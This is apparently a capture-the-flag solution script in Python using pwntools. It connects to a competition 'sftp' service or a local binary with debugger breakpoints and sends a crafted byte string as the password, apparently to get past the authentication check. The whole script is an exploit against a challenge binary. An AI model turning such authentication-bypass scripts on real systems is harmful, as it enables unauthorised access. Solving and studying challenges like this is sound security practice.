from pwn import *

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("sftp.ctfcompetition.com", 1337 )
else:
    p = process("./sftp")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *(0x555555554000+0x1510)
               b *(0x555555554000+0x1521)
               """)

p.recvuntil("(yes/no)?")
p.sendline("yes")
p.recvuntil("password:")
p.sendline("(AAAAA\x7e" + "\x80\x01\x01\x80\x01\x80\x80\x95")
p.interactive()

